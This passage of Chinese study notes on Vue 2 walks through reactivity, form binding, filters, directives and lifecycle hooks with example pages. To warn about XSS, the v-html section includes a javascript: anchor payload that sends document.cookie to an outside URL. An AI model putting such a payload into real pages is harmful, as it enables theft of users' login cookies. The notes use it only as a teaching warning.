    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vue.set的使用</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="addSex">添加一个性别属性，默认为男</button>
        <h2>学生姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">学生性别：{{student.sex}}</h2>
        <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
        <h2>朋友们</h2>
        <ul>
            <li v-for="(friend, index) in student.friends" :key="index">
                {{friend.name}}-{{friend.age}}
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                student: {
                    name: 'tom',
                    // sex: '男',
                    age: {
                        rAge: 40,
                        sAge: 29,
                    },
                    friends: [
                        {name: 'jerry', age: 35},
                        {name: 'tony', age: 36}  
                    ]
                }
            },
            methods: {
                addSex(){
                        // Vue.set(this.student, 'sex', '男')
                        this.$set(this.student, 'sex', '男')
                }
            }
        })
    </script>
</body>
</html>
```

调试结果：

点击前：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313162109221.png" alt="image-20230313162109221" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313162121578.png" alt="image-20230313162121578" style="zoom:50%;" />

但是`Vue.set()`或vm.$set()有缺陷：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313162325848.png" alt="image-20230313162325848" style="zoom:50%;" />

意思就是 不能在vm和_data里面直接添加数据对象



再研究**Vue如何监测数组里的数据**

代码：

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vue监测数据改变的原理_数组</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h2>爱好</h2>
        <ul>
            <li v-for="(item, index) in student.hobby" :key="index">
                {{item}}
            </li>
        </ul>
        <h2>朋友们</h2>
        <ul>
            <li v-for="(friend, index) in student.friends" :key="index">
                {{friend.name}}-{{friend.age}}
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                student: {
                    name: 'tom',
                    // sex: '男',
                    hobby: ['唱', '跳', 'rap', '篮球'],
                    friends: [
                        { name: 'jerry', age: 35 },
                        { name: 'tony', age: 36 }
                    ]
                }
            },
            methods: {
            }
        })
    </script>
</body>

</html>
```

我们通过`vm._data.student.hobby[0] = '起飞'`尝试往数组里添加元素是不行的，页面并没有更新我们的信息，这跟前面提出来的问题是一个性质

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313193900640.png" alt="image-20230313193900640" style="zoom:50%;" />

​	而且查看Vue对象发现，数组中并没有为各个数组元素服务的getter和settter

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313194007563.png" alt="image-20230313194007563" style="zoom:50%;" />

​	那么Vue是如何监测到数组中数据改变的呢？

​	答：Vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。

官网解释：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313194143623.png" alt="image-20230313194143623" style="zoom:50%;" />

​	所谓包裹，就是Vue对原生的数组方法进行了重写，当我们在Vue所接管的数组里面调用数组相关方法，会发现我们在Vue中调用和原生调用是不同的

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313194454159.png" alt="image-20230313194454159" style="zoom:50%;" />

​	被包裹的方法中主要有这几个操作：

		1. Vue会老老实实的在里面调用原生的方法
		1. 解析模板，生成虚拟DOM，对比前后的虚拟DOM.....

所以我们要想在Vue接管的数组中更新数据，得用被Vue重写的数组方法 注意图中的数据代理 和_data一样

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313194729745.png" alt="image-20230313194729745" style="zoom:50%;" />

另外，还可以用到我们上面提到的set方法来操作被Vue管理的数组（`Vue.set()和vm.$set()`都可以）

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313195011043.png" alt="image-20230313195011043" style="zoom:50%;" />

### 1.16.7 总结Vue数据监测 

Vue监视数据的原理：

1. Vue会监视data中所有层次的数据

2. 如何监测对象中的数据？

   通过setter实现监视，切要在`new Vue`时就传入要监测的数据

   1. 对象中后追加的属性，Vue不做响应式处理

   2. 如需给后添加的属性做响应式，请使用如下API:

      ​	`Vue.set(target, propertyName/index, value)`或

      ​	`vm.$set(target, propertyName/index, value)`

3. 如何监测数组中的数据？

   通过包裹数组更新元素的方法实现，本质就是做了两件事：

   1. 调用原生对应的方法对数组进行更新
   2. 重新解析模板，进而更新页面

4. 在Vue修改数组中的某个元素一定要用到如下方法：

   1. 使用这些API:`push()、pop()、shift()、unshift()、splice()、sort()、reverse()`
   2. `Vue.set()`或`vm.$set()`

​	特别注意：`Vue.set()`和`vm.$set()`不能给vm或vm的根数据对象添加属性！！！

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>总结Vue数据监测</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div>
        <h1>学生信息</h1>

        <button @click="student.age++">年龄+1岁</button><br/>
        <button @click="addSex">添加性别属性：默认值：男</button><br/>
        <button @click="addFriend">在列表首位添加一个朋友</button><br/>
        <button @click="changeFirstName">修改第一个朋友的名字为：张三</button><br/>
        <button @click="addHobby">添加一个爱好</button><br/>
        <button @click="changeFirstHobby">修改第一个爱好为：开车</button><br/>
        <button @click="removeBask('跳')">过滤掉括号中的爱好</button><br/>

        <h3>姓名：{{student.name}}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>年龄：{{student.age}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h, index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f, index) in student.friends" :key="index">
                {{f.name}}-{{f.age}}
            </li>
        </ul>
    </div>

    <script>
        const vm = new Vue({
            el: 'div',
            data: {
                student: {
                    name: 'tom',
                    age: 18,
                    hobby: ['唱', '跳', 'rap', '篮球'],
                    friends: [
                        {name: 'jerry', age: 36},
                        {name: 'tony', age: 37}
                    ]
                }
            },
            methods: {
                addSex(){
                    // Vue.set(this.student, 'sex', '男')
                    vm.$set(this.student, 'sex', '男')
                },
                addFriend(){
                    vm.student.friends.unshift({name: 'czq', age: 21})
                },
                changeFirstName(){
                    vm.student.friends[0].name = '张三'
                },
                addHobby(){
                    vm.student.hobby.push('鸡你太美')
                },
                changeFirstHobby(){
                    // vm.$set(this.student.hobby, 0, '开车')
                    vm.student.hobby.splice(0, 1, '开车')
                },
                removeBask(value){
                    vm.student.hobby = vm.student.hobby.filter((hobby) => {
                        return hobby !== value
                    })
                }
            },
        })
    </script>
</body>

</html>
```

## 1.17 收集表单数据

收集表单数据：

​	若：`<input type="text"/>`，则v-model收集的是`value`值，用户输入的就是`value`值

​	若：`<input type="radio"/>`，则v-model收集的是`value`值，切要给标签配置`value`值

​	若：`<input type="checkbox"/>`

				1. 没有配置input的`value`属性，那么收集的就是`checked`（勾选 或 未勾选，是布尔值）
				2. 配置input的`value`属性：
	      				1. v-model的初始值是非数组，那么收集的就是`checked`（勾选 或 未勾选，是布尔值）
	      				2. v-model的初始值是数组，那么收集的就是`value`组成的数组

备注：v-model的三个修饰符：

​		`lazy`：失去焦点时收集数据

​		`number`：输入字符串转为有效的数字

​		`trim`：输入首尾空格过滤

```HTML
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>收集表单数据</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <form @submit.prevent="submit">
            <label for="account">账号：</label>
            <input type="text" id="account" v-model.trim="userInfo.account"> <br /><br />
            <label for="password">密码：</label>
            <input type="password" id="password" v-model="userInfo.password"> <br /><br />

            年龄：<input type="number" v-model.number="userInfo.age"><br/><br/>
            性别：
            男 <input type="radio" name="sex" value="male" v-model="userInfo.sex">
            女 <input type="radio" name="sex" value="female" v-model="userInfo.sex"> <br /><br />
            爱好：
            唱 <input type="checkbox" value="sing" v-model="userInfo.hobby">
            跳 <input type="checkbox" value="dance" v-model="userInfo.hobby">
            rap <input type="checkbox" value="rap" v-model="userInfo.hobby">
            篮球 <input type="checkbox" value="bask" v-model="userInfo.hobby"><br /><br />
            所属校区
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select><br /><br />
            其他信息:
            <textarea v-model.lazy="userInfo.other"></textarea><br /><br />
            <input type="checkbox" v-model="userInfo.confirm">阅读并接受<a href="http://www.baidu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    age: null,
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    confirm: false
                }
            },
            methods: {
                submit() {
                    console.log(JSON.stringify(this.userInfo));
                }
            },
        })
    </script>
</body>

</html>
```

调试结果：

![image-20230315205820436](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230315205820436.png)

![image-20230315205916128](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230315205916128.png)

最后使用了json里面的解析字符串方法`stringify()`

## 1.18 过滤器（非重点）

​	定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）

​	语法：

1. 注册过滤器：`Vue.filter(name, callback)`或`new Vue{filters{}}`
2. 使用过滤器：`{xxx | 过滤器名}`或`v-bind:属性 = "xxx | 过滤器名"`

​	备注：

1. 过滤器也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据，是产生新的对应的数据

```html
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>过滤器</title>
        <script src="../js/vue.js"></script>
        <script src="../js/dayjs.min.js"></script>
    </head>

    <body>
        <div id="root">
            <h2>显示格式化后的时间</h2>
            <!-- 计算属性实现 -->
            <h3>现在是：{{fmtTime}}</h3>
            <!-- methods实现 -->
            <h3>现在是：{{getFmtTime()}}</h3>
            <!-- 过滤器实现 -->
            <h3>现在是：{{time | timeFormater}}</h3>
            <h3>现在是：{{time | timeFormater('YYYY_MM_DD')}}</h3>
            <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
            <h3 :x="msg | mySlice">czq</h3>
            <!-- <input type="text" v-model="msg | mySlice"> -->
        </div>

        <div id="root2">
            <h2>{{msg | mySlice}}</h2>
        </div>
        <script>
            // 全局过滤器
            Vue.filter('mySlice', function(value){
                return value.slice(0, 4)
            })

            const vm = new Vue({
                el: '#root',
                data: {
                    time: 1678957973974, //时间戳
                    msg: '你好，czq'
                },
                computed: {
                    fmtTime() {
                        return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                    }
                },
                methods: {
                    getFmtTime() {
                        return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                    }
                },
                // 局部的过滤器
                filters: {
                    timeFormater(value, str='YYYY-MM-DD HH:mm:ss'){
                        return dayjs(value).format(str)
                    },
                }
            })

            new Vue({
                el: '#root2',
                data: {
                    msg: 'hello,abc!'
                }
            })
        </script>
    </body>

    </html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316183247382.png" alt="image-20230316183247382" style="zoom:50%;" />

## 1.19 内置指令

**v-text指令：**

	1. 作用：向其所在的节点中渲染文本内容
	1. 与差值语法的区别：v-text会替换掉节点的内容，{{xxx}}则不会

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-text指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'czq',
                str: '<h3>你好啊</h3>'
            }
        })
    </script>
</body>
</html>
```

​	相比较下，插值语法的使用则灵活得多，因为一旦在标签中使用`v-text`，则标签体写什么已经没有了意义，而且也无法为我们解析模板

![image-20230316184705525](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316184705525.png)

**v-html指令：**

	1. 作用：向指定节点中渲染包含html结构的内容
	2. 与插值语法的区别：
	 	1. v-html会替换掉节点中所有的内容，{{xx}}则不会
	 	2. v-html可以识别html结构 

3. 严重注意：v-html上有安全性问题！！！
   1. 在网站上动态渲染人任意HTML是非常危险的，容易导致XSS攻击（因为用户提交的内容有可能就是一个恶意的a标签，点击可以获取你的所有cookie）
   2. 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上

补充：**关于Nodejs中的cookie：**

之所以我们在某些网站登陆了一次之后不用重新登陆，是因为我们第一次登录之后，服务器会在让我们成功登录的同时，或多或少给我们返回一些cookie，以便我们下次在访问其他用户验证的内容时不用重新验证我们的身份。cookie的本质就是字符串对象，以key-value的形式存储在浏览器中，cookie是不可以跨浏览器的，但是一旦我们持有cookie的浏览器中的cookie信息被他人获取，则可以在其他浏览器用我们的cookie登录我们的账号。所以我们要妥善保管我们的cookie，以防他人盗用后登录我们的账号干坏事

​	如用Chrome浏览器登录github所产生的cookie：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193024778.png" alt="image-20230316193024778" style="zoom:50%;" />

​	一旦心怀不轨的人获取到了这些cookie，就可以悄无声息的免密登录我们的账户

​	cookie的大致原理如图所示：

![image-20230316193336599](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193336599.png)

![image-20230316193413894](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193413894.png)

使用v-html解析并获取用户cookie的代码示例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-text指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'czq',
                str: '<h3>你好啊</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>获取cookie test</a>'
            }
        })
    </script>
</body>
</html>

```

在str2这个属性中，如果服务器写的不完善，不会隐藏cookie时，我们使用了a标签并且传了参数，而且跳转的网址中使用js命令`document.cookie`获取了用户的cookie，这样子cookie就会直接显示在用户的地址栏中，随时有可能被心怀不轨的远端窃取。

​	点击cookie test前：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193925950.png" alt="image-20230316193925950" style="zoom:50%;" />

点击后：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316193952934.png" alt="image-20230316193952934" style="zoom:50%;" />

我们的cookie则会直接显示在地址栏中。

所以必须注意使用这个v-html。

**v-cloak指令（没有值）：**

	1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
	1. 使用css（display: none）配合`v-cloak`属性可以解决网速慢时页面展示出{{xxx}}的问题

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-cloak指令</title>
    <script src="../js/vue.js"></script>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
</head>

<body>
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script>
        setTimeout(() => {
            new Vue({
                el: '#root',
                data: {
                    name: 'czq',
                }
            })
        }, 5000);
    </script>
</body>

</html>
```

5s结束之前：

![image-20230316200201025](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316200201025.png)

5s结束之后：

![image-20230316200245472](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316200245472.png)

由此可见，页面上有{{name}}这个内容，只不过被display:none了 后来vue接管后，瞬间删除了v-cloak并重新解析了模板

**v-once指令：**

	1. v-once所在的节点在初次动态渲染后，就被视为静态内容了
	1. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-once指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>当前的n值是：{{n}}</h2>
        <h2 v-once>初始化的n值是：{{n}}</h2>
        <button @click="n++">n + 1</button>
    </div>

    <script>
        new Vue({
            el: '#root',
            data: {
                n: 1
            }
        })
    </script>
</body>
</html>
```

![image-20230316201348533](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316201348533.png)

**v-pre指令：**

	1. 跳过其所在节点的编译过程
	1. 可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-pre指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>
        <h2 v-pre>当前的n值是：{{n}}</h2>
        <button v-pre @click="n++">n + 1</button>
    </div>

    <script>
        new Vue({
            el: '#root',
            data: {
                n: 1
            }
        })
    </script>
</body>
</html>
```

![image-20230316201859628](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316201859628.png)

由此可见，加入了v-pre指令的标签将不会被Vue解析

## 1.20 自定义指令

自定义指令有两种写法：函数式和对象式

函数式适合实现简单的业务逻辑（例如需求1），其缺点就是不可以解决细节上的问题

对象式适合实现有很多细节的业务逻辑（例如需求2），其缺点就是 写起来麻烦



​	需求1：定义一个`v-big`指令，和`v-text`功能类似，但会把绑定的数值放大10倍

​	在Vue中，指令的实质就是 操作了DOM元素，我们要想定义自定义指令，就意味着我们要在具体操作的过程中操作DOM元素来实现我们自定义指令的目的

​	我们需要借助`directives`这个配置项来实现我们的自定义指令：

```html
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span></h2>
        <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
        <button @click="n++">点我n + 1</button>
    </div>
```

函数式传入两个参数

	1. 真实DOM节点
	1. 绑定标签的相关信息（以对象的方式呈现）

例如：

```javascript
            directives: {
                // 函数式 写起来简单，但是解决不了细节上的问题
                // big函数何时会被调用？ 1. 指令与元素成功绑定时（一上来） 2. 指令所在的模板被重新解析时
                big(element, binding){
                    // element.innerText = binding.value * 10
                    console.log(element, binding);
                }
            }
```

![image-20230316205012372](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316205012372.png)

​	我们要想实现这个需求，主要重点关注value 由于我们在html使用这个指令的的时候 v-big="n"，这里读取的value就是1

实现业务1逻辑的代码：

```javascript
    new Vue({
        el: '#root',
        data: {
            n: 1
        },
        directives: {
            // 函数式 写起来简单，但是解决不了细节上的问题
            // big函数何时会被调用？ 1. 指令与元素成功绑定时（一上来） 2. 指令所在的模板被重新解析时
            big(element, binding){
                element.innerText = binding.value * 10
            }
        }
    })
```

![image-20230316205223278](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230316205223278.png)

​	需求2：定义一个`v-fbnd`指令，和`v-bind`功能类似，但可以让其所绑定的input元素默认获取焦点

```html
<input type="text" v-fbind:value="n">
```

​	这里将n当值赋给input框

```js
// 对象式可以解决细节上的问题（用了钩子，对调的时机都做了详细分割）
                fbind: {
                    // 当指令与元素成功绑定时（一上来）
                    bind(element, binding) {
                        element.value = binding.value
                    },
                    // 指令所在的元素被插入页面时
                    inserted(element, binding) {
                        element.focus()
                    },
                    // 指令所在的模板被重新解析时
                    update(element, binding) {
                        element.value = binding.value
                    }
                }
```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317164622139.png" alt="image-20230317164622139" style="zoom:50%;" />

1. 定义语法：

   1. 局部指令：

   ```
   newVue({
   	directives: {指令名: 配置对象}
   })
   或者
   new Vue({
   	directives{指令名, 回调函数}
   })
   ```

   2. 全局指令：

   ```
   Vue.directive(指令名, 配置对象) 或 Vue.directive(指令名, 回调函数)
   ```

   

2. 配置对象中常用当3个回调函数：

* bind(element, binding) 指令与元素成功绑定时调用

* inserted(element, binding) 指令所在元素被插入页面时调用

* update(element, binding) 指令所在模板结构被重新解析时调用 其逻辑往往和第一个一样

`element`就是DOM元素,`binding`就是要绑定当对象，它包含以下属性：`name` `value` `oldValue` `expression` `arg` `modifiers`

​	备注：

* 指令定义时不加`v-`，但使用时要加`v-`

* 指令名如果是多个单词，要使用`kekab-case`命名方式，不要用驼峰命名法

另提一点：在`directives`这个属性中，我们写的this为`window`

```javascript
                big(element, binding){
                    console.log('big', this); //注意，directives里面的this都是window
                    element.innerText = binding.value * 10
                    // console.log(element, binding);
                },
```

![image-20230317164657544](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317164657544.png)

## 1.21 生命周期

### 1.21.1 引出生命周期

​	需求：周期性地改变页面中文字当透明度，并要求在页面一挂载的时候就改变

​	我们可以有很多种方法，例如`Window.onload()`，然后拿到Vue实例将其改变，但是我们如何在Vue实例里面写呢？

​	这里需要用到生命周期钩子`mounted()`，它和method等配置项同级，本质是一个函数

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>引出生命周期</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 :style="{opacity: opacity}">起飞起飞起飞</h2>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                opacity: 1
            },
            methods: {
                
            },
            // Vue完成模板当解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
            mounted() {
                setInterval(() => {
                    this.opacity -= 0.01
                    if(this.opacity <= 0) this.opacity = 1
                }, 16);
            },
        })

        // 通过外部的定时器实现（不推荐）
        // setInterval(() => {
        //     vm.opacity -= 0.01
        //     if(vm.opacity <= 0) vm.opacity = 1
        // }, 16);
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317172449126.png" alt="image-20230317172449126" style="zoom:50%;" />

**生命周期：**

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子

2. 是什么？Vue在关键时刻帮我们调用的一些特殊名称的函数

3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据要求编写的

   ​	生命周期函数中的this指向是vm或组件实例对象

### 1.21.2 分析生命周期

要想知道生命周期的作用以及具体发生的事情，必须知道这个图：

![生命周期](/Users/chenzhengqing/Desktop/尚硅谷vue/资料（含课件）/02_原理图/生命周期.png)

```html
    <div id="root">
        <h2>当前的n值是：{{n}}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>
```

```js
       const vm = new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
                add(){
                    console.log('add');
                    this.n++
                },
                bye(){
					console.log('bye')
					this.$destroy()
				}
            },
            watch: {
                n(){
                    console.log('n变了');
                }
            },
       })
```



 * **beforeCreate钩子：**

​	这里的create指的是创建数据监测以及数据代理

​	此时无法通过vm访问到data中的数据、method中的方法

```javascript
						beforeCreate() {
                console.log('beforeCreate');
                 console.log(this);
                 debugger
            },
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317195539475.png" alt="image-20230317195539475" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317195554858.png" alt="image-20230317195554858" style="zoom:50%;" />

此时我们无法在vm中发现数据代理所用到的`_data`，method中所提到的方法以及数据监测所用到的getter和setter

* **created钩子：**

```js
						created() {
                console.log('created');
                console.log(this);
                debugger
            },
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317200028953.png" alt="image-20230317200028953" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317200049347.png" alt="image-20230317200049347" style="zoom:50%;" />

在create钩子调用的时候，vm出现了数据代理和监测需要的相关配置项，证明此刻数据代理和监测已经开始工作，但是页面还没有更新

* **beforeMount钩子：**

```js
            beforeMount() {
                console.log('beforeMount');
                console.log(this);
                debugger
            },
```

此时页面呈现的是**未经Vue编译**DOM结构，所有对DOM的操作，**最终**都不奏效

怎么理解？如果我在此时此刻对页面的元素进行操作，虽然在debugger时期，代码停到这里的时期可以相应，但是一旦我将程序放行，Vue将会接管这个页面，将真实DOM重新放在页面上。

操作DOM之前：

![image-20230317200754378](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317200754378.png)

操作DOM之后：

![image-20230317200821603](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317200821603.png)

放行程序之后：

![image-20230317200849324](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317200849324.png)

​	所以我们在这里操作DOM是徒劳无功的（其实用了Vue本来就不提倡我们操作真实DOM）

* **mount钩子：**

​	此时页面中呈现的都是**经过Vue编译**的DOM，我们对DOM的操作均有效（但是我们应当避免操作真实DOM）。至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等**初始化操作**

![image-20230317201150265](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317201150265.png)

此时发现Vue已经将真实DOM成功挂载到了页面中

* **beforeUpdate钩子：**

在我们这个钩子调用时，数据是新的，但是页面是旧的，页面尚未和数据保持同步

```js
						beforeUpdate() {
                console.log('beforeUpdate');
                console.log(this.n);
                debugger
            },
```

![image-20230317201625448](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317201625448.png)

当我们点n+1时，数据会进行更新，但页面中的数据不会变

在更新的前后，Vue就会进行我们喜闻乐见的根据新数据生产新的虚拟DOM，，随后与旧的虚拟DOM进行比较，最终完成页面的更新

* **updated钩子：**

此时，数据是新的，页面也是新的，页面与数据保持同步

```javascript
						updated() {
                console.log('updated');
                console.log(this.n);
                debugger
            },
```

![image-20230317201955000](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317201955000.png)

可以看到，此时数据和页面中的数据一致。

* **beforeDestory钩子：**

我们需要调用`vm.destroy()`这个函数来执行vm销毁

这个钩子调用时，vm中所有的：data、methods、指令等都处于可用状态，马上要执行销毁的过程，一般在此阶段：关闭定时器、取消订阅消息、解绑自定义事件等**收尾操作**

​	要注意的是：虽然这个销毁之前我们的data、methods都是可用的，但是我们如果在这里通过代码进行修改数据等一系列的操作时，Vue不会帮我们进行页面的更新，正所谓将死之时应该妥善安排后事（关闭定时器、取消订阅等），其他操作是无意义的

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317202512084.png" alt="image-20230317202512084" style="zoom:50%;" />

由此可见，页面没有更新

* **destroyed钩子：**

这里已经将vm摧毁了，但是页面还遗留着vm生前帮我们工作所留下来的真实DOM，当我们点击进行操作的时候页面当然不会进行更新

```javascript
						destroyed() {
                console.log('destoryed');
            },
```

![image-20230317203206059](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230317203206059.png)

完整代码：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>分析生命周期</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>当前的n值是：{{n}}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
                add(){
                    console.log('add');
                    this.n++
                },
                bye(){
					console.log('bye')
					this.$destroy()
				}
            },
            watch: {
                n(){
                    console.log('n变了');
                }
            },
            beforeCreate() {
                console.log('beforeCreate');
                // console.log(this);
                // debugger
            },
            created() {
                console.log('created');
                // console.log(this);
                // debugger
            },
            beforeMount() {
                console.log('beforeMount');
                // console.log(this);
                // debugger
            },
            mounted() {
                console.log('mounted');
                // debugger
            },
            beforeUpdate() {
                console.log('beforeUpdate');
                // console.log(this.n);
                // debugger
            },
            updated() {
                console.log('updated');
                // console.log(this.n);
                // debugger
            },
            beforeDestroy() {
                console.log('beforeDestory');
                // console.log(this.n);
                // debugger
            },
            destroyed() {
                console.log('destoryed');
            },
        })
    </script>
</body>
</html>
```

### 1.21.3 总结生命周期

常用的生命周期钩子：

	1. ` mounted`：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
	1. `beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】

关于销毁Vue实例

1. 销毁后借助Vue开发者工具看不到任何消息
2. 销毁后自定义会失效，但是原生DOM事件依然有效
3. 一般不会在`beforeDestroy`操作数据，因为即使操作了，也不会再触发更新流程了

# 2. Vue组件化编程

## 2.1 模块与组件、模块化与组件化

![image-20230318155127288](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318155127288.png)

